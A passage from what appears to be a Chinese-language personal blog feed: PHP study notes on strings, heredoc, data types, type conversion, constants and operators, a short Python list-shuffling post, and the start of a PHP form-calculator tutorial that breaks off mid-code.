<td>水平制表符</td>
</tr>
<tr>
<td>\\</td>
<td>反斜线</td>
</tr>
<tr>
<td>\$</td>
<td>美元符号</td>
</tr>
<tr>
<td>\“</td>
<td>双引号</td>
</tr>
<tr>
<td>\[0-7]{1,3}</td>
<td>正则，匹配一个用八进制符号表示的字符</td>
</tr>
<tr>
<td>\x[0-9A-Fa-f]{1,2}</td>
<td>正则，匹配一个用十六进制符号表示的字符</td>
</tr>
<tr>
<td>\u{xxxxx}</td>
<td>声明unicode字符（php7引入）</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $beer = <span class="string">'heineken'</span>;</span><br><span class="line">	<span class="comment">//可以解析，'在变量名中是无效的</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"$beer's taste is great"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p>heineken’s taste is great</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//不可以解析，s在变量名中有效</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"he drank some $beers"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p>he drank some     </p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//使用&#123;&#125;包含，可以将变量分离出来解析</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"He drank some $&#123;beer&#125;s"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p>He drank some heinekens    </p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//可以解析，&#123;&#125;的另一种用法</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"he drank some &#123;$beer&#125;s"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p>he drank some heinekens    </p>
</blockquote>
<p>解析unicode，php7开始支持</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"u\&#123;4f5c&#125; u\&#123;8005&#125; u\&#123;5f88&#125; u\&#123;5e05&#125;"</span>;</span><br></pre></td></tr></table></figure>

<h3 id="定界符-lt-lt-lt"><a href="#定界符-lt-lt-lt" class="headerlink" title="定界符&lt;&lt;&lt;"></a>定界符&lt;&lt;&lt;</h3><ul>
<li><p>定界符的命名规则和变量相同</p>
</li>
<li><p>通常用于从文件或者数据库中打断地输出文档</p>
</li>
<li><p>转义和变量解析同双引号</p>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    \$string = <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">    xxxxxxxxxxxxxxxxxxxx</span></span><br><span class="line"><span class="string">    xxxxxxxxxxxxxxxxxxxxxxxxx</span></span><br><span class="line"><span class="string">EOT;</span></span><br><span class="line"><span class="comment">//结束标识必须从行的第一列开始，且后面不能有除分号外的其它字符</span></span><br><span class="line"><span class="comment">//EOT也课换为其它命名</span></span><br><span class="line">	<span class="keyword">echo</span> \$string;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//解析变量、字符转义</span></span><br><span class="line">	$name = <span class="string">'MNname'</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">	my name is <span class="subst">$name</span>. I am printing a "string" \n.</span></span><br><span class="line"><span class="string">	\tNow, i am printing some new line \n\r.</span></span><br><span class="line"><span class="string">	\tthis should print a capital 'A'</span></span><br><span class="line"><span class="string">EOT;</span></span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/05/26/php/php1/image-20200528171648075.png"  alt="image-20200528171648075" style="zoom:67%;">


<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">//定界符不能用来初始化类成员</span></span><br><span class="line">    <span class="comment">//不可以这么写！！！！！！！</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">foo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $bar = <span class="string">&lt;&lt;&lt;EOT</span></span><br><span class="line"><span class="string">    bar</span></span><br><span class="line"><span class="string">EOT;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<strong>开始</strong>边界符字符串名称两边加上单引号和双引号（”EOT”），作用类似于单引号\双引号字符串</p>
<p>不加双引号时，作用同双引号</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;"EOT"</span></span><br><span class="line"><span class="string">	xxxxxxxxxx \x41</span></span><br><span class="line"><span class="string">EOT;</span></span><br></pre></td></tr></table></figure>



<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>PHP的数组实际上是一张有序图</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    	array(</span></span><br><span class="line"><span class="comment">            key1 =&gt; value1,</span></span><br><span class="line"><span class="comment">            key2 =&gt; value2</span></span><br><span class="line"><span class="comment">            ....</span></span><br><span class="line"><span class="comment">    	)</span></span><br><span class="line"><span class="comment">    	key可以是integer或者string</span></span><br><span class="line"><span class="comment">    	value可以是任意值</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    $arr = <span class="keyword">array</span>(<span class="string">"foo"</span> =&gt; <span class="string">"bar"</span>,<span class="number">12</span> =&gt; <span class="keyword">true</span>);</span><br><span class="line">	print_r($arr);		<span class="comment">//print_r()函数检查数组内的全部内容</span></span><br><span class="line">	<span class="keyword">echo</span> $arr[<span class="string">"foo"</span>];	<span class="comment">//通过数组下标访问单个数据</span></span><br><span class="line">	<span class="keyword">echo</span> $arr[<span class="number">12</span>];</span><br></pre></td></tr></table></figure>

<blockquote>
<p>print_r()输出：</p>
<p>Array<br>(<br>    [foo] =&gt; bar<br>    [12] =&gt; 1<br>)</p>
</blockquote>
<h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Person</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $name;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">say</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Doing foo."</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	$p = <span class="keyword">new</span> Person;<span class="comment">//用new语句实例化类Person的对象放在变量$p中</span></span><br><span class="line">	</span><br><span class="line">	$p-&gt;name=<span class="string">"TOM"</span>;</span><br><span class="line">	$p-&gt;say();</span><br></pre></td></tr></table></figure>

<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>资源类型的变量保存了到外部资源的一个引用</p>
<p>资源是通过专门的函数来建立和使用的</p>
<p>使用类型变量包含：打开的文件、数据库连接、图形画布区域等的特殊句柄，并由程序员创建使用和释放</p>
<p>在下面的实例中，使用相应的函数创建不同的资源变量，如果创建成功，则返回资源引用赋给变量；如果创建失败，则返回布尔型false </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//使用fopen()函数以写的方式打开本目录下的info.txt文件，返回文件资源赋给变量$file_handle</span></span><br><span class="line">    $file_handle = fopen(<span class="string">"info.txt"</span>,<span class="string">"w"</span>);</span><br><span class="line">	var_dump($file_handle);<span class="comment">//输出$resource(3) of type (stream)</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//使用opendir()函数打开目录，返回目录资源</span></span><br><span class="line">	$dir_hanle = opendir(<span class="string">"C:\\WINDOWS\\Fonts"</span>);</span><br><span class="line">	var_dump($dir_handle);<span class="comment">//输出$resource(4) of type (stream)</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//使用mysql_connect()连接本地的MySql，返回连接资源</span></span><br><span class="line">	$link_mysql = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"123456"</span>);</span><br><span class="line">	var_dump($link_mysql);<span class="comment">//输出$resource(5) of type (mysql link)</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//使用imagecreate()创建一个100*50像素的画板，返回图像资源</span></span><br><span class="line">	$im_handle = imagecreate(<span class="number">100</span>,<span class="number">50</span>);</span><br><span class="line">	var_dump($im_handle);<span class="comment">//输出$resource(6) of type (gd)</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//使用xml_parser_create()创建XML解析器资源</span></span><br><span class="line">	$xml_parser = xml_parser_create();</span><br><span class="line">	var_dump($xml_parser);<span class="comment">//输出$resource(7) of type (xml)</span></span><br></pre></td></tr></table></figure>



<h2 id="NULL"><a href="#NULL" class="headerlink" title="NULL"></a>NULL</h2><p>NULL不区分大小写</p>
<p>以下被认为是NULL</p>
<ul>
<li>直接赋值为NULL</li>
<li>声明的变量未赋值</li>
<li>被unset()函数销毁的变量</li>
</ul>
<h2 id="伪类型"><a href="#伪类型" class="headerlink" title="伪类型"></a>伪类型</h2><ul>
<li>mixed：说明一个参数可以接受多种不同的类型</li>
<li>number：说明一个参数可以是integer或float</li>
<li>callback</li>
</ul>
<h1 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h1><p>自动转换&amp;强制转换</p>
<h2 id="自动类型转换"><a href="#自动类型转换" class="headerlink" title="自动类型转换"></a>自动类型转换</h2><p>向长度增加方向进行</p>
<p>bool&amp;null&amp;string -&gt; integer/float</p>
<p>int -&gt; float</p>
<p>string转化字符串的数字部分,”123abc”-&gt; （int）123，“123.45abc” -&gt; (float) 123.45</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">    $foo = <span class="string">"100page"</span>;					<span class="comment">//string</span></span><br><span class="line">	$foo += <span class="number">2</span>;							<span class="comment">//int,102</span></span><br><span class="line">	$foo = $foo + <span class="number">1.3</span>;					<span class="comment">//float,103.3</span></span><br><span class="line">    $foo = <span class="keyword">null</span> + <span class="string">"10 little piggies"</span>;	<span class="comment">//int,10</span></span><br><span class="line">	$foo = <span class="number">5</span> + <span class="string">"10.05 yuan"</span>				<span class="comment">//float,15.05</span></span><br></pre></td></tr></table></figure>



<h2 id="强制类型转换"><a href="#强制类型转换" class="headerlink" title="强制类型转换"></a>强制类型转换</h2><p>类似于C++，</p>
<ul>
<li><p>(int),(bool),(float),(string),(array),(object)，没有改变变量本身的类型</p>
</li>
<li><pre><code class="php"><span class="meta">&lt;?php</span>
    <span class="comment">//没有改变变量本身的类型</span>
    $str = <span class="string">"123.45abc"</span>;
    $int = intval($str);
    $flo = floatval($str);
    $str = strval(<span class="number">123.45</span>);<span class="comment">//“123.45”</span>
&lt;!--￼<span class="number">25</span>--&gt;</code></pre>
</li>
<li><p>PHP7废除16进制字符串，原先“0xA”被识别为10，而新版被识别为0</p>
</li>
</ul>
<h2 id="变量类型的测试函数"><a href="#变量类型的测试函数" class="headerlink" title="变量类型的测试函数"></a>变量类型的测试函数</h2><ul>
<li>is_bool($var)</li>
<li>is_int(), is_integer(), is_long()</li>
<li>is_float(), is_double(), is_real()</li>
<li>is_string()</li>
<li>is_array() 判断是否为数组</li>
<li>is_object()</li>
<li>is_resource</li>
<li>is_null()</li>
<li>is_scalar()判断是否是标量——整数、浮点数、布尔型、字符串</li>
<li>is_numeric() 判断是否有任何类型的数字或数字字符串</li>
<li>is_callable() 判断是否是有效的函数名</li>
</ul>
<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>只能是标量数据</p>
<p>常量名前不要加$</p>
<p>常量一旦定义后就不能重新定义或者取消定义，直到脚本运行结束自动释放</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    define(<span class="string">"CON_INT"</span>,<span class="number">100</span>);</span><br><span class="line">	<span class="keyword">echo</span> CON_INT;<span class="comment">//获取常量值</span></span><br><span class="line">	constant(CON_INT);<span class="comment">//动态获得常量值</span></span><br><span class="line">	get_defined_constants();<span class="comment">//获得所有已定义的常量列表</span></span><br><span class="line"><span class="comment">//const和define定义数组</span></span><br><span class="line">	<span class="keyword">const</span> ARR=[<span class="string">'a'</span>,<span class="string">'b'</span>];</span><br><span class="line">	define(<span class="string">"BRR"</span>,[<span class="string">'a'</span>,<span class="string">'b'</span>]);</span><br></pre></td></tr></table></figure>

<h3 id="define-和-const-比较"><a href="#define-和-const-比较" class="headerlink" title="define 和 const 比较"></a>define 和 const 比较</h3><p>const用于类成员常量和全局常量，但是不能在条件语句中定义常量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//const编译时更快</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">true</span>)</span><br><span class="line">        <span class="keyword">const</span> FOO=<span class="string">'BAR'</span>;<span class="comment">//无效，cosnt不可以在条件语句中使用</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">true</span>)</span><br><span class="line">        define(<span class="string">"FOO"</span>,<span class="string">'CAR'</span>)<span class="comment">//可以</span></span><br></pre></td></tr></table></figure>

<p>const只能用于普通变量名</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">const</span> FOO=<span class="string">'BAR'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> ($i = <span class="number">0</span>;$i&lt;<span class="number">32</span>;++$i)</span><br><span class="line">        define(<span class="string">'YDMA_'</span>.$i,<span class="number">1</span>+$i);</span><br><span class="line">	<span class="keyword">echo</span> YDMA_</span><br></pre></td></tr></table></figure>



<h2 id="系统中的预定义常量"><a href="#系统中的预定义常量" class="headerlink" title="系统中的预定义常量"></a>系统中的预定义常量</h2><table>
<thead>
<tr>
<th>常量名</th>
<th>常量值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>PHP_OS</td>
<td>UNIX或WINNT等</td>
<td>执行PHP解析的操作系统名称</td>
</tr>
<tr>
<td>PHP_VERSION</td>
<td>7.1.9等</td>
<td>当前PHP服务器的版本</td>
</tr>
<tr>
<td>TRUE</td>
<td>TRUE</td>
<td></td>
</tr>
<tr>
<td>FALSE</td>
<td>FALSE</td>
<td></td>
</tr>
<tr>
<td>NULL</td>
<td>NULL</td>
<td></td>
</tr>
<tr>
<td>DIRECTORY_SEPARATOR</td>
<td>\或/</td>
<td></td>
</tr>
<tr>
<td>PATH_SEPARATOR</td>
<td>;或:</td>
<td>更具操作系统决定环境变量的目录列表分割符</td>
</tr>
<tr>
<td>E_ERROR</td>
<td>1</td>
<td>错误</td>
</tr>
<tr>
<td>E_WARNING</td>
<td>2</td>
<td>警告</td>
</tr>
<tr>
<td>E_PARSE</td>
<td>3</td>
<td>解析错误，由程序解析器报告</td>
</tr>
<tr>
<td>E_NOTICE</td>
<td>4</td>
<td>非关键的错误，例如变量未初始化</td>
</tr>
<tr>
<td>M_PI</td>
<td>3.1415926535898</td>
<td></td>
</tr>
</tbody></table>
<h2 id="魔术常量"><a href="#魔术常量" class="headerlink" title="魔术常量"></a>魔术常量</h2><table>
<thead>
<tr>
<th>常量名</th>
<th>常量值</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>_<em>FILE_</em></td>
<td>当前的文件名</td>
<td></td>
</tr>
<tr>
<td>_<em>LINE_</em></td>
<td>当前行数</td>
<td></td>
</tr>
<tr>
<td>_<em>FUNCTION_</em></td>
<td>当前函数名</td>
<td></td>
</tr>
<tr>
<td>_<em>CLASS_</em></td>
<td>当前类名</td>
<td>在哪个类中使用就代表哪个类的类名</td>
</tr>
<tr>
<td>_<em>METHOD_</em></td>
<td>当前对象的方法名</td>
<td>在哪个对象的方法中使用就代表这个方法名</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> PHP_OS.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> PHP_VERSION.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">__FILE__</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">__LINE__</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">__line__</span>.<span class="string">"&lt;br&gt;"</span>;</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/michelle19l/michelle19l/2020/05/26/php/php1/image-20200603174636486.png"  alt="image-20200603174636486"></p>
<h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><p>+、-、<em>、/、++、–、*</em></p>
<p>==和C不同的地方==</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $i = <span class="string">'a'</span>;</span><br><span class="line"><span class="keyword">for</span>($n = <span class="number">0</span>;$n &lt; <span class="number">52</span>;$n++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> ++$i.<span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：b c d e f g h i j k l m n o p q r s t u v w x y z aa ab ac ad ae af ag ah ai aj ak al am an ao ap aq ar as at au av aw ax ay az ba </p>
<h2 id="字符串运算"><a href="#字符串运算" class="headerlink" title="字符串运算"></a>字符串运算</h2><p>连接：“.”</p>
<h2 id="赋值运算"><a href="#赋值运算" class="headerlink" title="赋值运算"></a>赋值运算</h2><p>$x.=”3”</p>
<p>代表$x=​$x.”3”</p>
<p>其余同其他语言</p>
<h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>说明</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>===</td>
<td>全等于</td>
<td>在==的基础上添加“类型相同”</td>
<td>$a===$b</td>
</tr>
<tr>
<td>!==</td>
<td>非全等于</td>
<td>操作数不相等或类型不同</td>
<td></td>
</tr>
<tr>
<td>&lt;&gt;  /  !=</td>
<td>不等于</td>
<td></td>
<td></td>
</tr>
<tr>
<td>&lt;=&gt;</td>
<td>太空船运算符/组合比较运算符</td>
<td>当左边小于、等于、大于右边时，<br>分别返回-1，0，1（==可用于字符串比较==）</td>
<td>$a&lt;=&gt;$b</td>
</tr>
<tr>
<td>??</td>
<td>NULL合并操作符</td>
<td>从左往右第一个存在切不为NULL的操作数<br>如果都没有定义切不为NULL则返回NULL</td>
<td>$a ?? $b ?? $c</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//下面两条语句等价</span></span><br><span class="line">    $username = $_GET[<span class="string">'user'</span>] ?? <span class="string">'nobody'</span>;</span><br><span class="line">	$username = <span class="keyword">isset</span>($_GET[<span class="string">'user'</span>]) ? $_GET[<span class="string">'user'</span>] : <span class="string">'nobody'</span>;</span><br></pre></td></tr></table></figure>

<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>短路</p>
<p>and、&amp;&amp;</p>
<p>or、||</p>
<p>not、！</p>
<p>xor</p>
<h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><p>同C++</p>
<p>$a &amp;= $b 等价于 $a = $a &amp; $b</p>
<p>$a &gt;&gt;=$b 等价于 $a = $a&gt;&gt;$b</p>
<h2 id="其他运算符"><a href="#其他运算符" class="headerlink" title="其他运算符"></a>其他运算符</h2><table>
<thead>
<tr>
<th>运算符</th>
<th>描述</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td>?:</td>
<td></td>
<td></td>
</tr>
<tr>
<td>``</td>
<td>执行运算符</td>
<td></td>
</tr>
<tr>
<td>@</td>
<td>错误空值运算符，忽略表达式产生的错误信息</td>
<td>@表达式</td>
</tr>
<tr>
<td>=&gt;</td>
<td>数组加标指定符</td>
<td>键=&gt;值</td>
</tr>
<tr>
<td>-&gt;</td>
<td>对象成员访问</td>
<td></td>
</tr>
<tr>
<td>instanceof</td>
<td>类型运算符，用来测定一个给定的对象是否来自指定的对象类</td>
<td>对象instanceof类名</td>
</tr>
</tbody></table>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $output = <span class="string">'ls-la'</span>;<span class="comment">//使用``执行服务器操作系统的命令，讲结果赋值给$output</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;pre&gt; $output &lt;/pre&gt;"</span>;</span><br><span class="line"></span><br><span class="line">	$my_file = @file(<span class="string">"non_existent_file"</span>);</span><br><span class="line">	@$num = <span class="number">100</span>/<span class="number">0</span>;</span><br><span class="line">	<span class="comment">//使用头发送函数前面不能有任何输出，空格、空行都不行，否则会产生警告</span></span><br><span class="line">	@header(<span class="string">"Location: http://www.brophp.com"</span>);</span><br></pre></td></tr></table></figure>

<h2 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h2><table>
<thead>
<tr>
<th>级别（从高到低）</th>
<th>运算符</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>[</td>
</tr>
<tr>
<td>3</td>
<td>++，–</td>
</tr>
<tr>
<td>4</td>
<td>！，~，-，(int)，(float)，(string)，(array)，(object)，@</td>
</tr>
<tr>
<td>5</td>
<td>*，/，%</td>
</tr>
<tr>
<td>6</td>
<td>+，-</td>
</tr>
<tr>
<td>7</td>
<td>&lt;&lt;，&gt;&gt;</td>
</tr>
<tr>
<td>8</td>
<td>&lt;，&lt;=，&gt;，&gt;=</td>
</tr>
<tr>
<td>9</td>
<td>==，!=，===，!==，&lt;&gt;，&lt;=&gt;</td>
</tr>
<tr>
<td>10</td>
<td>&amp;</td>
</tr>
<tr>
<td>11</td>
<td>^</td>
</tr>
<tr>
<td>12</td>
<td>|</td>
</tr>
<tr>
<td>13</td>
<td>&amp;&amp;</td>
</tr>
<tr>
<td>14</td>
<td>||</td>
</tr>
<tr>
<td>15</td>
<td>??</td>
</tr>
<tr>
<td>16</td>
<td>?:</td>
</tr>
<tr>
<td>17</td>
<td>=，+=，-=，*=，/=，.=，%=，&amp;=，|=，^=，&lt;&lt;=，&gt;&gt;= （结合方向：从右到左）</td>
</tr>
<tr>
<td>18</td>
<td>and</td>
</tr>
<tr>
<td>19</td>
<td>xor</td>
</tr>
<tr>
<td>20</td>
<td>or</td>
</tr>
<tr>
<td>21</td>
<td>,</td>
</tr>
</tbody></table>
<h2 id="容易混淆的特殊值"><a href="#容易混淆的特殊值" class="headerlink" title="容易混淆的特殊值"></a>容易混淆的特殊值</h2><p>1代表true</p>
<p>0代表false</p>
<table>
<thead>
<tr>
<th>表达式</th>
<th>gettype()</th>
<th>empty()</th>
<th>is_null()</th>
<th>isset()</th>
<th>boolean():if($x)</th>
</tr>
</thead>
<tbody><tr>
<td>$x=””</td>
<td>string</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>$x=null</td>
<td>null</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>$x is undefined</td>
<td>null</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>var $x</td>
<td>null</td>
<td>1</td>
<td>1</td>
<td>0</td>
<td>0</td>
</tr>
<tr>
<td>$x=array()</td>
<td>array</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>$x=false</td>
<td>boolean</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>$x=true</td>
<td>boolean</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>$x=1</td>
<td>integer</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>$x=42</td>
<td>integer</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>$x=0</td>
<td>integer</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>$x=-1</td>
<td>integer</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>$x=”1”</td>
<td>string</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>$x=”0”</td>
<td>string</td>
<td>1</td>
<td>0</td>
<td>1</td>
<td>0</td>
</tr>
<tr>
<td>$x=”-1”</td>
<td>string</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>$x=”php”</td>
<td>string</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>$x=”true”</td>
<td>string</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
<tr>
<td>$x=”false”</td>
<td>string</td>
<td>0</td>
<td>0</td>
<td>1</td>
<td>1</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>python列表随机打乱顺序</title>
    <url>/2020/05/25/list%E6%89%93%E4%B9%B1/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">n=eval(input())</span><br><span class="line">m=list(range(<span class="number">1</span>,n+<span class="number">1</span>))</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"随机排序列表 : "</span>,  list)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,n):</span><br><span class="line">    random.shuffle(m) <span class="comment"># shuffle函数是将原list打乱而不是返回一个新的list</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,n):</span><br><span class="line">        print(m[j],end=<span class="string">' '</span>)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>random.shuffle</tag>
      </tags>
  </entry>
  <entry>
    <title>php学习二 —— 流程控制结构</title>
    <url>/2020/05/25/php/php2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><div class="note info">
            <p>参考书籍《细说PHP》</p>
          </div>

<h2 id="简易计算器"><a href="#简易计算器" class="headerlink" title="简易计算器"></a>简易计算器</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;title&gt;php calculator&lt;/title&gt;</span><br><span class="line">		&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html;charset=utf-8"</span> /&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$error=<span class="string">""</span>;<span class="comment">//声明一个错误信息</span></span><br><span class="line">	$num1=$_POST[<span class="string">"num1"</span>]; <span class="comment">//初始化第一个数</span></span><br><span class="line">	$num2=$_POST[<span class="string">"num2"</span>]; <span class="comment">//初始化第二个数</span></span><br><span class="line">	$operator=$_POST[<span class="string">"operator"</span>];</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//单路分支，使用isset判断用户是否有提交条件</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"sub"</span>]))&#123;</span><br><span class="line">		<span class="keyword">if</span>($num1==<span class="string">""</span>)</span><br><span class="line">			&#123;$error.=<span class="string">"第一个数不能为空&lt;br&gt;"</span>;&#125;</span><br><span class="line">		<span class="keyword">elseif</span>(!is_numeric($num1))</span><br><span class="line">			&#123;$error.=<span class="string">"第一个数不是数字&lt;br&gt;"</span>;&#125;</span><br><span class="line">		<span class="keyword">if</span>($num2==<span class="string">""</span>)</span><br><span class="line">			&#123;$error.=<span class="string">"第二个数不能为空&lt;br&gt;"</span>;&#125;</span><br><span class="line">		<span class="keyword">elseif</span>(!is_numeric($num2))</span><br><span class="line">			&#123;$error.=<span class="string">"第二个数不时数字&lt;br&gt;"</span>;&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(($operator==<span class="string">'/'</span> ||  $operator==<span class="string">'%'</span>)&amp;&amp; 